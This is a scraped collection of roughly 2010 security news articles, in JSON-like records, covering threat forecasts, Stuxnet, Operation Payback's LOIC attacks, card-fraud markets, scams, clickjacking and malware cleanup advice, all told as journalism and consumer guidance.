{ "_id" : { "$oid" : "5b35dab66cefc42b00293899" }, "Category" : "Malware", "Title" : "The ten biggest cyber security threats for 2011 !", "Address" : "https://thehackernews.com/2010/12/ten-biggest-cyber-security-threats-for.html", "Date" : "2010-12-22T13:05:00-11:00", "Article" : "PandaLabs, the antimalware laboratory of Panda Security, the cloud security company, has forecasted several radical innovations in cyber-crime for 2011. Hacktivism and cyber-war; more profit-oriented malware; social media; social engineering and malicious codes with the ability to adapt to avoid detection will be the main threats in the coming year. There will also be an increase in the threats to Mac users, new efforts to attack 64-bit systems and zero-day exploits. Following is a summary of what PandaLabs predicts as the ten major security trends of 2011: 1.Malware creation: In 2010, PandaLabs witnessed significant growth in the amount of malware and discovered at least 20 million new strains, more than in 2009. At present, Panda’s Collective Intelligence database stores a total of more than 60 million classified threats. The actual rate of growth year-on-year however, appears to have peaked. Several years ago it was over 100 percent and in 2010 it was 50 percent. 2.Cyber war: Stuxnet and the WikiLeaks cables suggesting the involvement of the Chinese government in the cyber-attacks on Google and other targets have marked a turning point in the history of these conflicts. Stuxnet was an attempt to interfere with processes in nuclear plants, specifically, with uranium centrifuge. Attacks such as these, albeit more or less sophisticated, are still ongoing, and will undoubtedly increase in 2011, even though many of them will go unnoticed by the general public. 3.Cyber-protests: Cyber-protests , or hacktivism, are all the rage and will continue to grow in frequency. This new movement was initiated by the Anonymous group and Operation Payback, targeting organizations trying to close the net on Internet piracy, and later in support of Julian Assange, editor-in-chief of WikiLeaks. Even users with limited technical know-how can join in the distributed denial of service attacks (DDoS) or spam campaigns. Despite hasty attempts in many countries to pass legislation to counter this type of activity effectively by criminalizing it, PandaLabs believes that in 2011 there will be more cyber-protests, organized by this group or others that will begin to emerge. 4.Social engineering: Cyber-criminals have found social media sites to be their perfect working environment, as users are even more trusting with these than with other types of tools, such as email. Throughout 2010, PandaLabs witnessed various attacks that used the two most popular social networks – Facebook and Twitter – as launching pads. In 2011, not only will hackers continue to use these networks, but it is predicted that they will also be used more for distributed attacks. BlackHat SEO attacks (indexing and positioning of fake websites in search engines) will also be widely employed throughout 2011, as always, taking advantage of hot topics to reach as many users as possible. In addition, a significant amount of malware will be disguised as plug-ins, media players and other similar applications. 5.Windows 7 influencing malware development: It will take at least two years before there is a proliferation of threats designed specifically for Windows 7. In 2010, PandaLabs began seeing a shift in this direction, and predicts that in 2011, new cases of malware targeting users of this new operating system will continue to emerge. 6.Mobile phones: In 2011 there will be new attacks on mobile phones, but it will not be on a massive scale. Most of the existing threats target devices with Symbian, an operating system which is now on the wane. Of the emerging systems, PandaLabs predicts that the threats for Android will increase considerably throughout the year, becoming the number one mobile target for cyber-crooks. 7.Tablets: The dominance of the iPad will start to be challenged by new competitors entering the market. Therefore PandaLabs does not believe that tablet PCs will become a major consideration for the cyber-criminals in 2011. 8.Mac: Malware for Mac exists, and will continue to exist. And as the market share of Mac users continues to grow, the number of threats will grow. The greatest concern is the number of security holes in the Apple operating system. Developers will need to patch these holes as soon as possible, as hackers are well aware of the possibilities that these vulnerabilities offer for propagating malware. 9.HTML5: HTML5 is the perfect target for many types of criminals and could eventually replace Flash. It can be run by browsers without any plug-ins, making it even more attractive to find a security hole that can be exploited to attack users regardless of which browser they use. PandaLabs expects to see the first attacks on HTML5 in the coming months. 10.Highly dynamic and encrypted threats: PandaLabs expects dynamic and encrypted threats to increase in 2011. PandaLabs is receiving more and more encrypted, stealth threats designed to connect to a server and update themselves before security companies can detect them. There are also more threats that target specific users, particularly companies, as information stolen from businesses will fetch a higher price on the black market." }

Christmas cards are a great way to send holiday wishes to those you love. But these days, many of us are opting to send our cards the electronic way using e-cards. \"One of the big problems around Christmastime is, everyone sends out Christmas cards. And that's great, and it's great to see one in your email inbox. The problem is, about half of them that you're going to get are actually links to viruses and Trojan horses that will infect your computer,\" explained News 4 WOAI Web Expert Bob Gambert. Some will attack your email address book and flood your friends' inboxes with spam. So how do you know which e-card is safe to open? Our computer expert says don't open any of them. Instead, work your way around them. \"Do not click on the link directly,\" Gambert said. \"Like, if it's from Hallmark, you'll want to go to the Hallmark website, and click on the 'card redemption' area, and there'll always be some kind of a code you should put in.\" Finally, a quick run of your anti-virus software will let you know if your computer is already infected. Some viruses even ask your permission to install that malware on your computer. They use an \"End User License Agreement\" that you have to agree to to see the e-card.

The move is an expansion of a program Google has had in place for years, which appends a “This site may harm your computer” link in search results for sites that Google has determined are hosting malicious software. The new notation – a warning that reads “This site may be compromised” – is designed to include pages that may not be malicious but which indicate that the site might not be completely under the control of the legitimate site owner — such as when spammers inject invisible links or redirects to pharmacy Web sites. Google also will be singling out sites that have had pages quietly added by phishers. While spam usually is routed through hacked personal computers, phishing Web pages most often are added to hacked, legitimate sites: The Anti-Phishing Working Group, an industry consortium, estimates that between 75 and 80 percent of phishing sites are legitimate sites that have been hacked and seeded with phishing kits designed to mimic established e-commerce and banking sites.It will be interesting to see if Google can speed up the process of re-vetting sites that were flagged as compromised, once they have been cleaned up by the site owners. In years past, many people who have had their sites flagged by Google for malware infections have complained that the search results warnings persist for weeks after sites have been scrubbed.Denis Sinegubko, founder and developer at Unmask Parasites, said Google has a lot of room for improvement on this front.“They know about it, and probably work internally on the improvements but they don’t disclose such info,” Sinegubko said. “This process is tricky. In some cases it may be very fast. But in others it may take unreasonably long. It uses the same form for reconsideration requests, but [Google says] it should be faster…less than two weeks for normal reconsideration requests.”But Maxim Weinstein, executive director of StopBadware, an independent non-profit anti-malware organization, said if Google delays de-listing a flagged site, it is usually because the site’s owner hasn’t fully eliminated the problem that caused the alert, or that site owner has skipped a step in Google’s reconsideration process.“If someone doesn’t know to request a review, it can be a while before Google’s system will on its own rescan the site and remove the warning,” Weinstein said.Google says it will be rolling out the new system slowly. As a result, not all of the sites that deserve to be flagged as compromised are listed that way yet.“For example, 90 percent of search results for this search should be labeled as ‘compromised,’ but I don’t see any warnings,” Sinegubko said.Web site administrators who find their pages flagged with “this site may harm your computer” warnings can get relatively speedy assistance at Badwarebusters.org, which maintains a fairly active and responsive help forum. Google also has a Webmaster Help Forum that includes amalware and hacked sites section, which already contains a few interesting threads about this new warning system. In one thread, John Mueller, a Webmaster trends analyst with Google Zurich, sheds a bit more light on the alert and cleanup process.“As mentioned by the others, this is triggered when we determine that your site has likely been compromised by an unauthorized third party. Once it’s shown that this is possible, it’s hard to predict what else may have been modified. For instance, it might be that in addition to hidden links, someone has changed the phone number or is redirecting orders to the wrong website — everything is possible once third parties are able to modify a website.”“Once you’ve reverted the compromise and – hopefully – taken steps to prevent this from happening again, you can submit a normal reconsideration request through Webmaster Tools. These requests are processed fairly quickly (usually within a day, though it’s not possible to give an exact timeframe).”" }

Are you mad at critics trying to snuff it out? Maybe you're thinking about joining the online protests aimed at shutting down the Web sites of its opponents. Don't. A loosely organized group of vigilantes under the name Anonymous have turned the botnet guns of their Operation Payback campaign, which previously targeted antipiracy organizations, on PayPal, Visa, MasterCard, Senator Joe Lieberman, Sarah Palin, and others who have criticized WikiLeaks or stopped doing business with the document-sharing project. The WikiLeaks fallout has hit a frenzy since the site began releasing diplomatic cables last month that have proved embarrassing for the U.S. government's diplomatic efforts. The modern-day equivalent of walking the picket line with a sign is launching denial-of-service attacks against target Web sites in order to send a message and try to interfere with their business. But the electronic version is illegal. \"Participating in a botnet with the intention of shutting down a Web site violates the Computer Fraud and Abuse Act,\" said Jennifer Granick, a lawyer at Zwillinger Genetski who specializes in Internet law and hacking cases. \"The thing people need to understand is that even if you have a political motive, it doesn't change the fact that the activity is unlawful.\" One person accused of being connected with the attacks has already been arrested. Police in the Netherlands arrested a 16-year-old hacker earlier this week. It's unclear what his role allegedly was. Typical botnets are created by criminals who use viruses and other methods to sneak malware onto computers that then allows them to commandeer the machines for distributed denial-of-service (DOS) attacks without the computer owners knowing it. Hijacked computers are being used in the Operation Payback campaign, but the focus has been getting individuals to voluntarily join. Thousands of people from around the world are downloading the LOIC (Low Orbit Ion Cannon) software so that their computer will attack the targets the Anonymous organizers specify. New versions of the DOS tool have emerged this week. There is a version for Linux and a Windows version that includes a \"Hivemind\" feature to connect to an Internet Relay Chat server and allow the organizers to control what site the computer targets. There is even a JavaScript version that runs on any device, including smart phones. \"The JavaScript one, you just point the browser at a site and say 'go,'\" said Jose Nazario, senior manager of security research at Arbor Networks. As many as 3,000 computers voluntarily participated in attacks earlier this week, and an estimated 30,000 others appeared to be hijacked, according to Sean-Paul Correll, a threat researcher at Panda Labs who has been following the attacks closely and communicating with Operation Payback organizers. There's a snag, however, for the volunteer botnet protesters--their Internet Protocol (IP) addresses are not masked, so the attacks could ultimately be traced back to the computers launching them, experts say. Of course, it's up to the discretion of prosecutors as to whether or not individual botnet volunteers will be fingered by authorities. \"There may be strength in numbers,\" said Granick. \"There's only so many people the police could go after. But that doesn't mean that they couldn't find out who is behind the unmasked IP numbers and file computer charges against them.\" Operation Payback is fending off DOS attacks that have scuttled its efforts. The servers being used to provide the infrastructure for Operation Payback have been taken offline intermittently. No one has taken responsibility for those attacks. \"Right now it appears they are regrouping and strategizing for future attacks,\" said Correll. (Anonymous explains that its goal is to raise awareness not interfere with targets' critical infrastructure.) Meanwhile, a separate campaign sprang up out of nowhere that could give WikiLeaks fans a more legal way of expressing their support for the cause. An online flyer for \"Operation Leakspin\" published by Boing Boing encourages people to find juicy bits in the leaked cables and spread them virally on the Internet in blog posts and YouTube videos and use unrelated tags that will ensure broad interest. It's unclear who is behind Operation Leakspin. \"There's no hierarchical structure (to the Anonymous collective), so when things happen, like their server infrastructure is under attack, people tend to want to take control of the campaign,\" Correll said. \"Even though thousands of people want to participate there doesn't seem to be a cohesive plan about what to do next,\" he said. \"It's fizzling out.\"" }

Unfortunately, it also offers plenty of opportunities for organised crime. Rather than going it alone, many Internet criminals join organised crime groups or they create new ones. Whether the reasons are economic, cultural, or technical, the motivations behind joining the virtual criminal universe are plentiful. Around the world, some individuals and many organised crime or mafia groups carry out illegal acts on the web, often in the hope of becoming rich. Australia is one of the top 10 target countries for cybercrime. We recently came across an incident where Australian credit card holders' personal information was compromised when it was published on a website originating from Vietnam. This might seem like a one-off case, however, these incidents are part of an organised cybercrime effort. Every day, thousands of pieces of information related to stolen, misappropriated, and sometimes even fake credit cards are sold by cybercriminals. Three packages are typically offered: CC dump: This is the information available on the credit card's magnetic strip. Bought in large quantity, a simple dump costs only around US$0.10 (AU$0.09). CC full info: This contains all of the details about a bank card and its owner. The exact nature of data varies by vendor. Depending on quality and countries, the cost ranges from US$2 to US$30 (AU$1.97 to AU$29.60). COBs (Credit Card with Change of Billing): More powerful than the CC full, this offer makes it possible to take total control over the pirated account. The information provided allows the buyer to change the victim's address to gain better security for future fraudulent transactions (delivery, mailed bank statements, and point of contact). Prices vary from US$80 to US$300 (AU$79 to AU$296), depending on supply and the authorised balance transfer and spending limits. To gather a user's personal information, cybercriminals are exploiting software vulnerabilities and human psychology to spawn a broad range of malware and threats including spyware, phishing, botnets, adware, rootkits (a group of programs designed to take control of a PC), spam, and unsafe websites. They no longer deliver threats only via spam and are taking advantage of popular social networking sites to secure personal identify information. The malware underworld is also using mainstream practices in an effort to \"sell\" fake security software that is either misleading or outright fraudulent. Many consumers are increasingly shopping online, taking advantage of the rising Australian dollar or looking for bargain deals in the lead up to Christmas. They need to be aware of the security risks that exist and protect themselves against spam and malware attacks by using the latest security software with real-time malware updates and be wary of sharing any personal information even if it is a popular website." }

These systems are often utilized to manage water supplies, power plants and other industrial facilities, making the worm especially dangerous for governments. Who Wrote this ProgramExperts in the cyber security field have speculated that Stuxnet may have been created by a government or a well-financed group of investors, as the worm is too complex to have been developed by a single hacker. The fact that the virus has done much of its damage in Iran has caused many experts to question whether Stuxnet was designed to sabotage the country’s nuclear facilities. Cyber-Attacks Getting More SophisticatedEven if Stuxnet wasn’t targeting U.S. infrastructure, its creation signifies a new wave of cyberattacks, viruses and malware that are designed to attack infrastructure, such as power-generating facilities. This is no longer a world where malicious defacement of Web pages is what we are focused on as a department or government. We need to become worried about more sophisticated attacks; we are worried about migration to things of value. Can Stuxnet Get Into Home Computers“Aurora had a zero-day, but it was a zero-day against [Internet Explorer version 6],” he said. “Here you have a vulnerability, which is effective against every version of Windows since Windows 2000.” Recall, Microsoft no longer supports Windows 2000 and other older versions still heavily used in ICS applications. Stuxnet can use MS08-067, the same vulnerability used by Downadup (a.k.a. Conficker) to spread. MS08-067 is a critical vulnerability in the Windows Server Service on Windows 2008/Vista/2003/XP/2000 computers, which allows hackers to gain remote control of the affected computer with the same privileges as a logged on user. Patches, Fixes, Antivirus AvailableStuxnet is an attack on physical processes, which means it is not “patchable.” Given a sophisticated cyber attack targeted at ICSs, there is little chance the ICS community will be able to detect it. IT malware researchers have the best chance of finding it. The ICS community needs to meet them and work with them. For Stuxnet, the ICS community needs to understand how to detect the infection so as to know whether to trust the control systems. The only advice that seems to make any sense as far as this virus goes is to have back-up plans ready if your system is impacted." }

Experts have said that the cost and manpower required to create such a virus seem to indicate that a government, rather than a rogue hacker or criminal gang, was behind the virus' creation. Still, Schaffer downplayed the overall threat of Stuxnet within the United States. \"There was some risk, because those software packages exist within the U.S. ecosystem,\" he said. \"But it's not clear there are any particular process within the United States that would have triggered the software.\" Despite widespread speculation that Stuxnet was created to target Iran's Bushehr nuclear plant, there has been little solid evidence to back up that claim. Bruce Schneier is among the security experts who have expressed skepticism, pointing to evidence that Stuxnet had spread to other countries, like India. \"By allowing Stuxnet to spread globally, its authors committed collateral damage worldwide,\" Schneier wrote. \"From a foreign policy perspective, that seems dumb.\" That Stuxnet may not have meant to target U.S. systems doesn't mean that facilities in the United States are safe from the virus. \"One of the tricks about any piece of malware is it doesn't necessarily stay in the form in which it was released,\" Schaffer said, noting that such software can be manipulated by others as it spreads. He declined, however, to speculate on who or what was the original target of Stuxnet. Even if Stuxnet wasn't targeting U.S. infrastructure, its creation signifies a new wave of cyberattacks -- viruses and malware that are designed to attack infrastructure, such as power-generating facilities. \"This is no longer a world where malicious defacements of Web pages is what we are focused on as a department or government,\" Schaffer said. \"We are worried about more sophisticated attacks; we are worried about migration to things of value.\" Stuxnet, Shaffer says, is simply more evidence of such attacks targeting physical infrastructure. \"Those,\" he said, \"are the kinds of things that give us pause.\"" }

This type of attack typically doesn't include a malicious payload, but it will definitely annoy any of your friends who fall for it. Here's how to avoid that scenario.Usually the post itself uses a short phrase or sentence that's just a bit provocative. The point is to arouse your curiosity. If you do fall for the attack that's currently making the rounds you'll get a warning that the content may be inappropriate and a request to confirm that you're 18 or older, like this: Once you click the button to confirm your age you'll see another embedded dialog box. This one claims a need to prove that you're human, in order to avoid spam bots that are \"putting an extra load on our servers.\" The box requests that you click numbered buttons in a certain order, like this: Clicking those buttons doesn't prove you're human, except in the sense of \"to err is human.\" By clicking the buttons you're actually posting the clickjacking attack in your own Facebook profile, thereby spreading it to all of your friends. If you encounter this attack, don't click the buttons. If you've already fallen for it, delete the post from your profile.Symantec's free Norton Safe Web for Facebook did not detect the specific attack shown here. AVG's LinkScanner Online also gave the link a clean bill of health. Symantec representatives explained that Norton Safe Web \"currently detects and warns users against links to phishing sites and those that distribute malware. Since [this link] … does not drop any malware or send users to malicious sites, Safe Web for Facebook won't show those links as unsafe.

Joseph Camp and Daniel Fowler were both indicted by a federal grand jury. The pair allegedly developed a computer virus and distributed it through email attachments and USB flash drives. In all, they breached the personal data of about 90,000 UCM students, faculty, staff and alumni. Camp and Fowler then tried to sell the information for $35,000. The seven-count indictment also charges them with trying to steal university funds and using Facebook accounts to threaten potential witnesses. The charges carry possible prison sentences of between two and 10 years. \"The duo used Fowler's room as their base and over a three-month period between October and December 2009 broke into numerous university databases and computers - including one belonging to a university administrator,\" according to a Computerworld report. Both were enrolled in the school at the time of the attacks. For companies and organizations, the case highlights the need for data-leak prevention measures, such as tight email security that includes an anti-spam filter to help protect against a malware infection. According to the Kansas City Star, U.S. Attorney Beth Phillips has praised the university's data-leak prevention measures that allowed it to \"thwart\" the pair from profiting from the scheme. Camp and Fowler monitored systems infected with their virus, recorded keystrokes, stole data and could even control a computer's webcam. In one instance, they reportedly hacked a residence hall director's credentials to transfer university funds into their student accounts, according to Computerworld. They did this on 30 occasions with transfer amounts ranging from $50 to $4,300, according to the federal indictment. Many of the pair's hacks were perpetrated over the 2009 Thanksgiving holiday break in an attempt to avoid detection. Authorities arrested Camp in New York after recording conversations he had with someone identified only as T.S., the person the pair were trying to sell the stolen information to. When he was arrested, Camp had four Excel spreadsheets that contained the breached information. Companies and organizations have to constantly be on the lookout for sophisticated attacks, such as the one in the UCM case that combined thumb drives and email attacks. According to a recent data protection trends report, an email solutions vendor predicts such blended attacks will be more common in 2011." }

The news comes from GetSafeOnline.org, who is using it to kickoff a week of events supporting Internet safety. These fly-by-night boiler room operations sometimes employ up to 400 people, who use a mix of sales and social engineering to scam their victims into believing that their system is in desperate need of repair. The end goal is to walk away with credit card information, verified when the Rogue anti-Virus is purchased, or remote access to the victim’s system for future use. A typical call likely comes out of the blue. On the other end of the line, a person claiming to be an IT Helpdesk technician begins the process of forming a rapport with the mark. Like any other cold calling scam, the idea is to form an instant bond. The caller starts by representing themselves to the mark in a position of authority and trust, by first collecting, and then using various bits of personal information that someone in IT might know. This information is easily discovered thanks to bulk marketing lists available online, and the power of social networking. From there the mark is most likely quizzed on virus related issues and other computer problems, such as slow email and Internet browsing, or slow system startups. All the mark needs to do is admit to having one of those symptoms, or something close, and the caller can press the pain by explaining what will happen if this problem isn’t fixed. Then, just as the pain clearly present, the caller offers a solution. “For a small fee,” they might say, “we can install something to fix your system and clean it completely. No more slow startups, your Web surfing will speed up, and email will arrive nearly instantly.” If the mark falls for it, game over. The caller collects their credit card details, with as much other information as they can, and charges the card anywhere form $50-79.00 USD to prove it works. Next, the Rogue anti-Virus software is installed. After that, the caller hangs up and moves on. If the mark doesn’t fall for the scam in the first few minutes of the call, then the caller hangs up and moves on. With cold calling, the clock is ticking. If the mark isn’t your buddy in the first 90 seconds; you end the call and find a new friend. It may seem like a stretch, but cold calling scams have worked for a long time in the commodities market (currency and precious metal trading), as well as real-estate and general stock-based scams. The thing is, cold calling itself isn’t an illegal act. It’s a legit marketing and sales tool. However, there is a right way and wrong way to go about it. Selling fraudulent items, such as the Rogue anti-Virus is illegal, using cold calling to set sales appointments isn’t. The trick is to hear the word no enough times; even legit cold calling operations and salespeople will tell you that. If you hear no ten times, then the eleventh person is going to say yes. It’s only a matter of time so keep dialing. Again, this tactic is nothing new, but with 1-in-4 U.K. Internet users admitting to having talked to an IT Helpdesk person out of the blue offering such services, the numbers can equal a hefty payday for the criminals running scam. Baroness Neville-Jones, the Minister of State for Security, commented, “Given that our latest research indicates 80% of UK internet users have never heard of these ‘IT helpdesk’ scams, yet almost a quarter have been approached by them, it is vital that we make people aware of this threat.” Webmasters aren’t left out in the cold either. The criminals doing the cold calling are also adding legitimate webmasters to an affiliate system that will pay them for each successful installation of the Rogue anti-Virus software. This is an ironic twist as the criminals themselves are paid on a per install basis via an affiliate program themselves. However, there is plenty of money to be earned by the shady PPI programs, so cutting someone into a small percentage for a massive take is worth the investment. The figures listed by GetSafeOnline.org say that criminals are investing up to $150,000 USD per month in the payouts. Although the last few years have seen some steady improvements in installing computer security software and detecting common scams, the GetSafeOnline.org report noted, over a third of U.K. internet users (34%) still report being the victim of a Malware attack, 22% have experienced a Phishing scam, and over 1 in 5 (21%) have been a victim of identity fraud. These cold calling scams are easily avoided. They use human emotion to work, and the people on the other end are expert button pushers. They will use fear, greed, and guilt to get what they want, but all you have to do is trust your gut. If it sounds too good to be true, then it is. Never agree to anything sales related over the phone, especially if it is random contact and you need to pay now. Ask for time to think or simply stall by flooding the caller with random questions. They’re on a clock, so stalling them will make them press harder or end the call. If they press harder, hang up. Don’t be the eleventh caller who will tell them yes." }

The Internet security vendor joined several other security firms, including Blue Coat and BitDefender, to warn users searching online for Halloween-related topics. \"Popular search terms have always been a target for cyber-criminals,\" said Achal Khetarpal, director of CyberDefender Research Labs. CyberDefender identified a fake anti-virus Trojan downloader infecting pages that come up when searching for Halloween costumes. When users land on these infected pages, the fake anti-virus installer hijacks the user’s Web browser and initiates a malicious process, CyberDefender said. The infected PC becomes sluggish and slow-performing while exposing personal data, according to the company. One form, identified by Panda Labs, displays a fake video player page and asks the user to download a codec in order to play the video. Popular search terms reflect what users are interested in at that time, making it a lucrative target. Criminals often create pages that are highly search engine optimized, with keywords reflecting currently popular search terms, said Khetarpal. Called SEO poisoning, hackers create these pages that Google and other search engines pick up thinking they are legitimate, and return them when users type in the search terms, said CyberDefender. According to Panda Labs, searching for Halloween costumes, Halloween decorations, Halloween ideas, Adult Halloween costumes, and Free pumpkin pattern, can return search results with malicious links. Blue Coat said clicking on the infected link lands users on a page hosted within a hacked blog, which then redirects users to a malware distribution site. Users are presented with a download for an executable file with a name that was constructed based on the original search term, said Blue Coat. For example, users typing \"Regis and Kelly Halloween show\" in the search engine will see a filename like \"regis-and-kelly-halloween-show-2009-to-play-40064,\" or \"office appropriate Halloween costumes\" returning \"office-appropriate-halloween-costumes-to-play-40064,\" said Blue Coat. According to the screenshot of malicious search results posted on the Panda Labs blog, the listed URL looks legitimate, with phrases like \"halloween-costumes\" embedded in the URL, and the page name also looks relevant, such as \"Viking Halloween costume.\" The description is a giveaway, since it seems to not have anything to do with the page. According to BitDefender, \"If you’re planning to find templates for Halloween invitations, or if you’re trying to find a print shop for what you already have, then you should keep an eye on what search results you’re about to click.\" Khetarpal advised users to manually type the Web site URL, instead of just clicking on links displayed on the Google search results page. For example, if the search results page show a Halloween costume at Target, users should type target.com in the address bar and search within the store’s Web site instead of clicking on the link directly. This way, users won’t be re-directed to an infected site, Khetarpal said. \"Users should only click trusted links or type in the site address they want into the search bar,\" he said. Spammers and hackers often take advantage of current events, popular trends, and holidays like Halloween to target users. For example, there tends to be surge in the volume of spam with Super Bowl-related subject lines. According to Khetarpal, holidays and celebrities are \"hot topics\" and \"prime targets\" for malware authors. Khetarpal and other security experts advised users to verify they have a security software suite installed on the computer before going online, let alone searching for something. The suite should be updated to its most recent version, and the operating system should be patched with the latest updates, they said." }

The FBI said that the suspects worked as so-called mules for hackers, who were based in Eastern Europe and used malware to hack US computers and succeeded in stealing around $70m. Some people were detained in Ukraine and the UK as well. FBI said in its statement that the hackers stole money from the bank accounts of small companies, municipalities, churches and other victims in the U.S. “This was a major theft ring,” said FBI Assistant Director Gordon Snow, of the bureau’s cyber division, in a statement. “Global criminal activity on this scale is a threat to our financial infrastructure, and it can only be effectively countered through the kind of international cooperation we have seen in this case.” FBI officials said the arrests were part of \"one of the largest cyber criminal cases we have ever investigated\". A US Attorney said that the people arrested in the US have been charged with conspiracy to commit bank fraud and money laundering. The FBI added that the hackers were planning to steal around $220 million. The operation to nab these international hackers kicked off in Omaha in May last year when FBI agents noticed a row of suspicious bank transactions. Officials from the US, Ukraine, the Netherlands and the UK were involved in the investigation. The hackers used malware contained in seemingly benign e-mails to the victims to carry out their activities." }

Corporate environments are experiencing more cyber crime, and intellectual property is increasingly a target for criminal activity. This is according to Uri Rivner, head of new technologies, identity protection and verification at RSA, speaking during a roundtable at the RSA conference in London this week. He said in the past, cyber crime was a one-man operation – the basement hacker causing mischief. These days, he added, it is an entire economy, run like legitimate businesses with a few obvious exceptions. “Online fraud is divided into two parts – harvesting and cash out,” he said. “This translates into those stealing and collecting the data, and those monetising it, cashing in the accounts using the stolen credentials.” According to Rivner, it is ridiculously easy to launch a Trojan attack these days, as they can be purchased off the Internet with ease. “A Trojan costs around $700, with the famous Zeus Trojan costing $3 000. An adware system goes for around $300 and random crypto about $200.” He noted that the Zeus Trojan even comes with customer support. “Perhaps the most famous banking Trojan, it steals data through keystroke logging. It is spread mainly through drive-by downloads and phishing schemes. In addition, Zeus can steal other information, or activity, such as a users' stock trading data, or even online dating information.” Another piece of malware responsible for the theft of hundreds of thousands of bank account details is Sinowal, also known as Torpig. “This is a type of botnet spread by a variety of Trojans affecting computers using MS Windows. “It circumvents AV through the use of rootkit technology and scans the infected system for credentials, accounts and passwords as well as potentially allowing attackers full access to the computer. It is also purportedly capable of modifying data on the computer,” he explained. He said these sorts of malicious programs are starting to infect corporations. “88% of Fortune 500 companies said they had been infected at some point. “Both private and corporate information is stolen, and these days it is no longer about the network, it's about the people,” added Rivner. “We have seen an increase in 'spear phishing' or targeting a specific employee to get control of the PC and steal company information.” He cites the Aurora attack as an example of this. “Operation Aurora is a cyber attack that happened between mid-2009 and December that year. It was first publicly disclosed by Google in January 2010, and the company said it originated in China.” It was reported the attack has been aimed at several companies besides Google, with Adobe Systems, Juniper Networks and Rackspace publicly confirming themselves as targets. Rivner said the attack used spear phishing, usually an e-mail containing a link to a malicious Web page, with the exploit contained directly in its javascript, in the case of browser exploits, or otherwise the script downloads an auxiliary file with an exploit that targets a browser plug-in. Either way, the PC's security is compromised and the cyber criminal can direct the browser to secretly download malware. Once installed, the cyber criminal has a foothold in the corporate network, and can begin searching for the data. “In this way, once you have the resource you have access to the network.” Unfortunately, Rivner said, RSA's recent research shows many companies are unaware of the impact of malware on their systems, and the accompanying, significant threat to their information and bottom line." }

What many people don't realize, however, is that Linux can also be used to rescue a computer that has been crippled by malware.Malware is a frequent occurrence in the Windows world, in particular, and it can be devastating. When a Windows virus strikes, not only can it become difficult or even impossible to continue using the affected machine, but it can be dangerous as well, since prolonged use can further the infection. That's where Linux can be a life-saver. Without ever having to install the free alternative, you can still use it temporarily on a PC to get rid of any infection. Here's how. 1. Get a LiveCD or Live USB LiveCDs and USBs are a wonderful thing in the Linux world because they let you boot a machine directly from the CD or USB stick without ever having to access the computer's boot records. Not only are they a great way to take Linux for a test-drive, but they can also be put to work when Windows can't. By far the fastest way to get a LiveCD or USB is to download the .iso file of the Linux distribution you'd like to use and then burn it onto a CD or USB stick. Since Ubuntu is the most popular distribution out there, I'll go with Maverick Meerkat--the latest version of the software--for this example. Ubuntu can be downloaded from the project's Website for use on a LiveCD or USB; download links for other distributions can be found listed on FrozenTech. UNetbootin is another nice option if you want to go the USB route, which tends to run much faster. Of course, to take either of these options you'll have to have a working, Internet-connected computer. If you don't, or if your Internet connection is slow, you may want to order a LiveCD or USB via snail mail. OSDisc and LinuxCD both offer a variety of options; pricing is about $2. 2. Boot into Linux Once you're equipped with a Linux LiveCD or USB, you'll need to make sure the infected computer is turned off, and then turn it on again with the CD or USB installed. This will boot the computer into Linux, completely bypassing Windows and its infection. Again, nothing has been installed -- you're simply using Linux to get the machine running reliably again. 3. Get Antivirus Software Next it's time to get the Linux-based ammunition you'll need to wipe out the malware: antivirus software. I'm going to use ClamAV, my favorite, via ClamTK, which provides a nice graphical front end. From the main Ubuntu desktop, then, go to \"Applications\" and then \"Ubuntu Software Center.\" Choose \"Edit\" and then \"Software Sources.\" You'll be presented with a box entitled, \"Downloadable from the Internet,\" and you should be sure all four boxes are checked before you click on \"Close.\" Next, from the main Ubuntu Software Center page, click on the \"Accessories\" icon and type ClamTK into the search box. It will be shown as \"Virus Scanner,\" but if you click on \"More Info\" you can verify it's the right package. Click \"Install\" and wait for it to download. Once installation is finished, you should launch ClamTK by going to \"Applications\" in Ubuntu's main menu, then \"Accessories\" and \"Virus Scanner,\" which is how the software will still be shown. 4. Run a Scan When the ClamTK window opens, click on the \"Scan\" tab and select the option for a Recursive Scan. Next, you'll need to tell the software which drive you want to check for viruses, which in this case is the one that includes Windows. Scanning may take some time, but once the infection is found you'll get the usual options for what to do with it, including quarantine and removal. 5. Return to Normal Assuming the infection has now been removed, your computer should be clean once again, making it safe to remove the LiveCD or USB and boot back into Windows as usual. As you enjoy your malware-free machine once again, remember that it's all thanks to Linux. It's also not a bad idea to keep your LiveCD or USB handy so you'll be ready for the next time." }

According to Google Code site, “Project Hosting on Google Code provides a free collaborative development environment for open source projects. Each project comes with its own member controls, Subversion/Mercurial repository, issue tracker, wiki pages, and downloads section. Our project hosting service is simple, fast, reliable, and scalable, so that you can focus on your own open source development”.The malicious project in question has about 50+ executable stored in the download section of the project. Most of the files are executable files along with zipped “.rar” files. The time stamps show that the files have been uploaded over the course of the last month. This suggests that an attacker is actively using this free service to spread malware. Virustotal results for the first file, show that only 8 antivirus vendors out of 43 flagged the file as malicious. The detection ratio for second file is slightly better than that of the first file.Analysis of all files shows that they are all malicious threats including Trojans horses, backdoors, password stealing Keyloggers for online games such as “World of Warcraft” etc. Analysis of the file resources from ThreatExpert report indicates the possible country of origin is China. Interestingly, Google Code FAQ page says they will take down the whole project if they find malware being hosted on the project. Google has immediately taken down the project and URL to that project is no longer accessible. Source: zScaler Research" }

The report, from TrustWave, is based on an analysis of data gathered from over 1900 penetration tests and over 200 data breach investigations conducted on behalf of clients such as American Express, MasterCard, Discover, Visa and several large retailers. The analysis showed is that major global companies are employing \"vulnerability chasers\" and searching out the latest vulnerabilities and zero-day threats while overlooking the most common ones, the report said. Trustwave buys Breach Security As a result, companies continue to be felled by old and supposedly well understood vulnerabilities rather than by newfangled attack tools and methods. For instance, the top three ways hackers gained initial access to corporate networks in 2009 were via remote access applications, trusted internal network connections and SQL injection attacks, TrustWave found. All three attacks points have been well researched and known about for several years. SQL injection vulnerabilities, for instance, have been known about for at least 10 years, but still continue to be widely prevalent in web-based, database-driven applications, TrustWave said. The most common vulnerability that TrustWave discovered during its external network penetration tests had to do with the management interfaces for web application engines such as Websphere, and Cold Fusion. In many cases, the management interfaces were accessible directly from the Internet and had little or no password protection, potentially allowing attackers to deploy their own malicious applications on the web server. Similarly unprotected network infrastructure components such as routers, switches and VPN concentrators represented the second most common vulnerability unearthed by TrustWave. The tendency by many companies to host internal applications on the same server that also hosts external content was another common vulnerability, as were misconfigured firewall rules, default or easy-to-guess passwords and DNS cache poisoning. Meanwhile TrustWave's wireless penetration tests unearthed common weaknesses 